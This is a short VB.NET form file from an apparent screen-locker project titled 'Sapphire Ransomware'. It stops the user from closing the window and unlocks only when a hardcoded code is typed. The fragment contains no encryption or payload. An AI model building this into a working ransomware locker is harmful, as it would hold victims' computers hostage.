Public Class Form2
    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "sapphire_is_a_good_color" Then
            Form3.Show()
            Me.Hide()
        Else
            MsgBox("Wrong code! Try again!", MsgBoxStyle.Critical, "Sapphire Ransomware")
        End If
    End Sub
End Class